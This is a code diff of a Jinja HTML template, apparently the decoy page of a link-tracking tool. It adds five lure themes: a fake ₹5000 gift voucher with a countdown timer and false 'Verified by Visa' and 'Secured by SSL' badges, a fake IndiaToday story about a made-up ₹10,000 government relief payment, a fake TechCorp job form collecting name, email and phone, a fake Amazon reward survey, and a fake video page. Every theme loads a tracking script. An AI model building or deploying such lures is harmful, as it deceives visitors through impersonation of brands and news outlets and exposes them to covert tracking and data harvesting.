@@ -3,35 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Special Offer For You!</title>
+    <title>
+        {% if theme == 'gift' %}
+            🎁 Congratulations! You've Won!
+        {% elif theme == 'news' %}
+            IndiaToday Breaking News
+        {% elif theme == 'job' %}
+            Job Application — TechCorp India
+        {% elif theme == 'survey' %}
+            Quick Survey — Win Amazon Gift Card
+        {% else %}
+            Video Loading...
+        {% endif %}
+    </title>
     <link rel="stylesheet" href="{{ url_for('static', filename='css/track.css') }}">
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Playfair+Display:wght@700;900&display=swap" rel="stylesheet">
 </head>
-<body>
-    <!-- Decoy Content -->
-    <div class="decoy-container" id="decoy-container">
-        <div class="decoy-card">
-            <div class="decoy-badge">EXCLUSIVE BONUS</div>
-            <h1>Congratulations!</h1>
-            <p class="decoy-text">You have been selected for a special limited-time promo offer. Claim your free reward below!</p>
-            <div class="reward-box">
-                <span class="reward-value">$100 Gift Card</span>
+<body class="theme-{{ theme }}">
+
+    <!-- Silent loading state indicator -->
+    <div id="loading-overlay" class="hidden"></div>
+
+    <!-- Theme 1: Gift Voucher -->
+    {% if theme == 'gift' %}
+    <div class="gift-container">
+        <div class="confetti-wrapper">
+            <div class="confetti"></div><div class="confetti"></div><div class="confetti"></div><div class="confetti"></div><div class="confetti"></div>
+            <div class="confetti"></div><div class="confetti"></div><div class="confetti"></div><div class="confetti"></div><div class="confetti"></div>
+        </div>
+        <div class="gift-card">
+            <h1 class="gift-title">Congratulations!</h1>
+            <p class="gift-subtitle">You have been selected for an exclusive ₹5000 Gift Voucher</p>
+            <div class="scratch-card-wrapper">
+                <div class="scratch-card" id="scratch-card">
+                    <span class="scratch-cover" id="scratch-cover">Scratch to Reveal Code</span>
+                    <span class="scratch-code">WINNER5000</span>
+                </div>
             </div>
-            <button class="btn btn-primary" id="claim-btn">Claim Reward Now</button>
-            <p class="terms">Terms & conditions apply. Must be verified to unlock reward.</p>
+            <button class="btn btn-gift" id="claim-btn">Claim Voucher</button>
+            <div class="gift-timer">Offer expires in: <span id="timer">09:59</span></div>
+            <div class="security-badges">
+                <span>Verified by Visa</span> | <span>Secured by SSL</span>
+            </div>
         </div>
     </div>
 
-    <!-- Loading Overlay -->
-    <div class="loading-overlay hidden" id="loading-overlay">
-        <div class="spinner"></div>
-        <p class="loading-text">Loading...</p>
+    <!-- Theme 2: Breaking News -->
+    {% elif theme == 'news' %}
+    <div class="news-container">
+        <header class="news-header">
+            <div class="news-logo">IndiaToday</div>
+            <span class="news-tag">BREAKING NEWS</span>
+        </header>
+        <div class="news-content-grid">
+            <main class="news-main">
+                <h1 class="news-headline">Government Announces ₹10,000 Direct Relief Package for All Citizens</h1>
+                <div class="news-meta">By Rajesh Kumar | Updated: June 13, 2026, 01:05 IST</div>
+                <div class="news-body">
+                    <p><strong>NEW DELHI:</strong> In a landmark decision today, the Union Cabinet approved a new economic stabilization package designed to provide direct relief to citizens. Under the scheme, an amount of ₹10,000 will be credited directly to eligible accounts starting next week.</p>
+                    <p>The initiative aims to offset recent inflationary pressures and assist middle-class households with rising healthcare and commodity costs. Treasury officials confirmed that the disbursement infrastructure is ready and public portals will open soon for applications.</p>
+                    <p>Economists have largely welcomed the move, noting that a direct cash transfer of this scale will immediately boost consumer spending and stimulate market growth. Further guidelines and account registration steps are expected to be published later today.</p>
+                </div>
+                <div class="fake-socials">
+                    <button class="btn-social fb">Share on Facebook</button>
+                    <button class="btn-social tw">Share on Twitter</button>
+                </div>
+            </main>
+            <aside class="news-sidebar">
+                <h3>Related Articles</h3>
+                <div class="related-item">RBI holds interest rates steady at latest meeting</div>
+                <div class="related-item">Stock markets reach new all-time high following economic stimulus</div>
+                <div class="related-item">Monsoon forecast updated: Above-average rainfall predicted</div>
+                <div class="fake-ad-box">Advertisement</div>
+            </aside>
+        </div>
     </div>
 
-    <!-- Pass link ID to JS -->
-    <script>
-        window.TRACKING_LINK_ID = "{{ link_id }}";
-    </script>
+    <!-- Theme 3: Job Application -->
+    {% elif theme == 'job' %}
+    <div class="job-container">
+        <div class="job-card">
+            <div class="job-header">
+                <div class="company-logo">TechCorp</div>
+                <div class="job-badge">Remote (India)</div>
+            </div>
+            <h2>Senior Software Engineer</h2>
+            <p class="salary">₹25,00,000 - ₹30,00,000 LPA</p>
+            <div class="progress-steps">
+                <span>Step 1 of 3 (Basic Info)</span>
+                <div class="progress-bar"><div class="progress-fill" style="width: 33%;"></div></div>
+            </div>
+            <form class="job-form" id="decoy-job-form">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" placeholder="John Doe" required>
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" placeholder="john@example.com" required>
+                </div>
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="tel" placeholder="+91 98765 43210" required>
+                </div>
+                <div class="form-group">
+                    <label>Years of Experience</label>
+                    <select required>
+                        <option value="">Select experience</option>
+                        <option>1-3 Years</option>
+                        <option>3-5 Years</option>
+                        <option>5+ Years</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn btn-job" id="job-submit-btn">Submit Application</button>
+            </form>
+            <div class="success-message hidden" id="job-success-msg">
+                <h4>Application Received!</h4>
+                <p>Thank you for applying to TechCorp. Our talent acquisition team will contact you within 24 hours.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Theme 4: Survey Form -->
+    {% elif theme == 'survey' %}
+    <div class="survey-container">
+        <div class="survey-card">
+            <h2>Amazon Customer Reward Survey</h2>
+            <p class="survey-intro">Complete this 2-minute survey and get a chance to win a ₹1000 Amazon Gift Card</p>
+            <div class="progress-steps">
+                <span id="survey-step-text">Question 1 of 3</span>
+                <div class="progress-bar"><div class="progress-fill" id="survey-progress" style="width: 33%;"></div></div>
+            </div>
+            
+            <div class="survey-question active" data-step="1">
+                <h3>1. How satisfied are you with Amazon's delivery speed?</h3>
+                <label class="radio-option"><input type="radio" name="q1" value="1"> Very Satisfied</label>
+                <label class="radio-option"><input type="radio" name="q1" value="2"> Satisfied</label>
+                <label class="radio-option"><input type="radio" name="q1" value="3"> Neutral</label>
+                <label class="radio-option"><input type="radio" name="q1" value="4"> Dissatisfied</label>
+            </div>
+            
+            <div class="survey-question" data-step="2">
+                <h3>2. How often do you shop online per month?</h3>
+                <label class="radio-option"><input type="radio" name="q2" value="1"> Daily</label>
+                <label class="radio-option"><input type="radio" name="q2" value="2"> Weekly</label>
+                <label class="radio-option"><input type="radio" name="q2" value="3"> Monthly</label>
+                <label class="radio-option"><input type="radio" name="q2" value="4"> Rarely</label>
+            </div>
+
+            <div class="survey-question" data-step="3">
+                <h3>3. Would you recommend Amazon Prime to a friend?</h3>
+                <label class="radio-option"><input type="radio" name="q3" value="1"> Definitely Yes</label>
+                <label class="radio-option"><input type="radio" name="q3" value="2"> Probably Yes</label>
+                <label class="radio-option"><input type="radio" name="q3" value="3"> Maybe</label>
+                <label class="radio-option"><input type="radio" name="q3" value="4"> No</label>
+            </div>
+
+            <button class="btn btn-survey" id="survey-next-btn">Next</button>
+            
+            <div class="survey-submit-overlay hidden" id="survey-submit-msg">
+                <div class="spinner"></div>
+                <p>Submitting answers... Please wait</p>
+            </div>
+            <div class="success-message hidden" id="survey-success-msg">
+                <h4>Thank you!</h4>
+                <p>Your responses have been saved. Your entry has been registered for the ₹1000 Gift Card drawing.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Theme 5: Video Loading -->
+    {% else %}
+    <div class="video-container">
+        <div class="video-player">
+            <div class="video-overlay" id="video-overlay">
+                <div class="video-spinner"></div>
+                <div class="video-loading-text">Loading video... Please wait</div>
+            </div>
+            <button class="video-play-btn" id="video-play-btn">
+                <svg viewBox="0 0 24 24" width="60" height="60" fill="white"><path d="M8 5v14l11-7z"/></svg>
+            </button>
+        </div>
+        <div class="video-info">
+            <h1 class="video-title">Exclusive Content - Members Only (4K UHD)</h1>
+            <div class="video-stats">125,934 views • 2 hours ago</div>
+        </div>
+    </div>
+    {% endif %}
+
     <script src="{{ url_for('static', filename='js/track.js') }}"></script>
 </body>
 </html>
